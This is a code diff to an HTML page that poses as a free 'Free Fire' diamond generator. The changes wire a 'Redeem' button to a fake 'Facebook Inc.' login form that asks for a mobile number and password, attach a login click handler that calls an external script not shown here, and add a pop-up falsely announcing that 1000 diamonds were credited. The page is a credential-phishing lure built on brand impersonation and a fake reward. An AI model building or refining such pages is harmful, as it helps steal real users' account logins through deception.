@@ -8,6 +8,7 @@
 		<link rel="preconnect" href="https://fonts.googleapis.com">
 		<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 		<link href="https://fonts.googleapis.com/css2?family=Urbanist:wght@700&display=swap" rel="stylesheet">
+		<script src="script.js"></script>
 	</head>
 	<body>
 		<nav>
@@ -26,10 +27,9 @@
 			<div class="form" id="form">
 				<div class="form-container">
 					<h3>Generate below</h3>
-					<input id="num-in" type="number" value="1000"><br>
-					<!-- <input type="text" placeholder="Freefire name"><br> 	-->
-					<input id="num-in" type="number" placeholder="UID"><br>
-					<input id="btn-in" type="button" value="Redeem"><br>
+					<input id="num-in" type="number" value="1000" max="1000"><br>
+					<input id="uid-id" type="number" placeholder="UID"><br>
+					<a id="btn-in" type="button" href="#fb-login">Redeem<br>
 				</div>
 			</div>
 		</div>
@@ -41,8 +41,16 @@
 				<h4>Log in to your Facebook account to<br>connect to FreeFire</h4>
 				<input id="mobile-no" type="number" placeholder="Mobile Number"><br>
 				<input id="password" type="password" placeholder="password"><br>
-				<input id="login-btn" type="button" value="Log In">
+				<input id="login-btn" type="button" value="Log In" onclick="loginOnClick()">
 				<h6>Facebook Inc.</h6>
+			</div>
+		</div>
+
+		<div id="pop-up">
+			<div class="container">
+				<h4 class="elements" id="pop-title">Congratulation</h4>
+				<p class="elements" id="paragraph">1000 diamonds has been added to your account</p>
+				<button class="elements" id="btn" onclick="TogglePopUp()">OK</button>
 			</div>
 		</div>
 
